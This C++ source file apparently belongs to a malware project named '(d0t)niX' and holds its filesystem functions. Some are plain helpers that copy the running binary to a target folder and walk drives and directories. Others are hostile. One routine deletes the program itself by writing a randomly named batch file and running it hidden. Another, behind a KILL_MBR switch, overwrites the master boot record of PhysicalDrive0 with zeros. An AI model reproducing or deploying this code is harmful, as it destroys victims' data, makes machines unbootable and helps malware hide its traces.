/*-----------------------------------------------------+------------------------\
 |    ___    _________    __  ___          ______  ___ | ___________            |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / | \_   _____/_______ __  |
 |  /  / / __ | /  / \  \   __\\  \ /    \|  |\     /  |  |    __)  ___<   |  | |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  |  |     \\___ \ \___  | |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ |  \___  /____  >/ ____| |
 |   \__\    \/        \/     /__/      \/         \_/ |      \/     \/ \/      |
 +--------------------------------------------------+--+------------------------/
 | Filsystem.cpp :: (d0t)niX's Filesystem Functions |
 \--------------------------------------------------*/

#include "../../Header-Files/pch.h"
#include "../../Header-Files/(d0t)niX.h"

// Improve this
BOOL fnCopyFileW(
	_In_ LPCWSTR lpAdpn,
	_In_ LPCWSTR lpAdfn
) {
	if (CreateDirectory(lpAdpn, NULL)) {
		if (CopyFile(szMfn, lpAdfn, FALSE)) {
			return TRUE;
		} else {
			fnMESSAGEHANDLERW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
			return FALSE;
		}
	} else {
		if (GetLastError() == ERROR_ALREADY_EXISTS) {
			fnMESSAGEHANDLERW(NULL, L"Directory already exist\nPath: %s", L"CreateDirectoryW", MB_ICONWARNING, lpAdpn);

			if (CopyFile(szMfn, lpAdfn, FALSE)) {
				return TRUE;
			} else {
				fnMESSAGEHANDLERW(NULL, L"Couldn't copy Binary to target Path\nFile: %s\nPath: %s", L"CopyFileW", MB_ICONERROR, szMfn, lpAdfn);
				return FALSE;
			}
		} else {
			fnMESSAGEHANDLERW(NULL, L"Couldn't create target Directory\nPath: %s", L"CreateDirectoryW", MB_ICONERROR, lpAdpn);
			return FALSE;
		}
	}

	return FALSE;
}

// TODO: Use Pointers
BOOL fnDriveEnumeratorW(
	_Inout_ std::vector<std::wstring>* vszDrives
) {
	WCHAR szDrives[nDRIVES];
	std::wstring szDrive;
	if (GetLogicalDriveStrings(nDRIVES, szDrives)) {
		for (INT i = 0; i < nDRIVES; i += 4) {
			if (szDrives[i] != L'\0') {
				szDrive = { szDrives[i], szDrives[i + 1], szDrives[i + 2] };

				UINT uDt = GetDriveType(szDrive.c_str());
				if (uDt) {
					if (uDt != DRIVE_NO_ROOT_DIR && uDt != DRIVE_CDROM) {
						vszDrives->push_back(szDrive);
					}
				} else {
					fnMESSAGEHANDLERW(NULL, L"Couldn't determin Drive type\nPath: %s", L"GetDriveTypeW", MB_ICONWARNING, szDrive.c_str());
				}
			}
		}

		return TRUE;
	} else {
		fnMESSAGEHANDLERW(NULL, L"Couldn't enumerate Drives", L"GetLogicalDriveStringsW", MB_ICONERROR);
		return FALSE;
	}
}

// TODO: Use Pointers
BOOL fnDirectoryIteratorW(
	_In_    LPCWSTR                    szDir,
	_In_    LPCWSTR                    szMask,
	_Inout_ std::vector<std::wstring>* vszDir,
	_Inout_ std::vector<std::wstring>* vszFile
) {
	WIN32_FIND_DATA w32Fd;
	std::wstring szW32fd = ((std::wstring)szDir + L"\\" + (std::wstring)szMask);
	HANDLE hFind = FindFirstFile(szW32fd.c_str(), &w32Fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (wcscmp(w32Fd.cFileName, L".") != 0 && wcscmp(w32Fd.cFileName, L"..") != 0) {
					vszDir->push_back((std::wstring)szDir + L"\\" + w32Fd.cFileName);
				}
			} else {
				vszFile->push_back((std::wstring)szDir + L"\\" + w32Fd.cFileName);
			}
		} while (FindNextFile(hFind, &w32Fd));

		FindClose(hFind);
		return TRUE;
	} else {
		fnMESSAGEHANDLERW(NULL, L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
		return FALSE;
	}
}

// Failed Attempt Backup
//BOOL fnDirectoryIteratorW(
//	_In_    LPCWSTR               szDir,
//	_In_    LPCWSTR               szMask,
//	_Inout_ std::vector<LPCWSTR>* vszDir,
//	_Inout_ std::vector<LPCWSTR>* vszFile
//) {
//	WIN32_FIND_DATA w32Fd;
//	std::wstring szW32fd = ((std::wstring)szDir + L"\\" + (std::wstring)szMask);
//	HANDLE hFind = FindFirstFile(szW32fd.c_str(), &w32Fd);
//	if (hFind != INVALID_HANDLE_VALUE) {
//		do {
//			LPCWSTR lpFound = new WCHAR[MAX_PATH]{ *(((std::wstring)szDir + L"\\" + w32Fd.cFileName).c_str()) };
//
//			if (w32Fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
//				if (wcscmp(w32Fd.cFileName, L".") != 0 && wcscmp(w32Fd.cFileName, L"..") != 0) {
//					//					LPCWSTR lpDir = new WCHAR[MAX_PATH]{ *(((std::wstring)szDir + L"\\" + w32Fd.cFileName).c_str()) };
//					//					LPCWSTR lpDir = new WCHAR[MAX_PATH];
//					//					((std::wstring)szDir + L"\\" + w32Fd.cFileName)._Copy_s((LPWSTR)lpDir, MAX_PATH, MAX_PATH);
//					vszDir->push_back(lpFound);
//				}
//			} else {
//				//				LPCWSTR lpFile = new WCHAR[MAX_PATH];
//				//				((std::wstring)szDir + L"\\" + w32Fd.cFileName)._Copy_s((LPWSTR)lpFile, MAX_PATH, MAX_PATH);
//				vszFile->push_back(lpFound);
//			}
//		} while (FindNextFile(hFind, &w32Fd));
//
//		FindClose(hFind);
//		return TRUE;
//	}
//	else {
//		fnMESSAGEHANDLERW(L"Couldn't open Handle \"hFind\" to FirstFile\nFile: %s", NULL, L"FindFirstFileW", MB_ICONERROR, szW32fd.c_str());
//		return FALSE;
//	}
//}

BOOL fnSelfDeleteW(VOID) {
	DWORD dwBufferSize = NULL;
	HANDLE hHeap = GetProcessHeap();

	LPCWSTR lpCGRS = fnCryptGenRandomStringW(NULL, nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN), szCharSet);
	std::wstring szBat = szCd + (std::wstring)lpCGRS + L".bat";

	LPVOID lpBuffer = fnLoadResourceW(IDR_RCDATA101, RT_RCDATA, &dwBufferSize);
	if (lpBuffer) {
		LPVOID pszDest = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (dwBufferSize + ((lstrlen(szMfn) * 2) * 2) + (lstrlen(szBat.c_str()))));
		if (pszDest) {
			SIZE_T ulHeap = HeapSize(hHeap, NULL, pszDest);
			if (ulHeap != (SIZE_T)-1) {
				if (SUCCEEDED(StringCbPrintf((LPWSTR)pszDest, ulHeap, (LPCWSTR)lpBuffer, szMfn, szMfn, szBat))) {
					if (fnSaveResourceW(szBat.c_str(), pszDest, ulHeap)) {
						INT dwError = (INT)ShellExecute(NULL, L"open", szBat.c_str(), NULL, szCd, SW_HIDE);
						if (dwError > 32) {
							HeapFree(hHeap, NULL, pszDest);
							return TRUE;
						} else {

						}
					} else {

					}
				} else {

				}
			} else {

			}

			HeapFree(hHeap, NULL, pszDest);
		} else {

		}
	}

	delete[] lpCGRS;
	return FALSE;
}

#if KILL_MBR == TRUE
	// at somepoint I might implement a custom MBR displaying a message
	BOOL fnOverwriteMBR(VOID) {
		WCHAR szMbrData[nMBR];
		ZeroMemory(&szMbrData, sizeof(szMbrData));
		DWORD dwNOBW;

		HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (hMbr) {
			if (WriteFile(hMbr, szMbrData, nMBR, &dwNOBW, NULL)) {
				CloseHandle(hMbr);
				return TRUE;
			} else {
				fnMESSAGEHANDLERW(NULL, L"Couldn't overwrite MBR", L"WriteFile", MB_ICONERROR);
				CloseHandle(hMbr);
				return FALSE;
			}
		} else {
			fnMESSAGEHANDLERW(NULL, L"Couldn't open Handle \"hMbr\" to MBR", L"CreateFileW", MB_ICONERROR);
			return FALSE;
		}
	}
#endif // KILL_MBR